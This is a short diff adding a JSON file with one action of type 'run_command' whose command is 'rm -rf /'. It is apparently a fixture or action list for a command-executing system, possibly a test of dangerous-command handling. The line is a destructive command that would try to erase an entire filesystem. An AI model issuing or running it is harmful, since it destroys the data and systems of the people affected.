@@ -1,0 +1,6 @@
+[
+  {
+    "type": "run_command",
+    "command": "rm -rf /"
+  }
+]
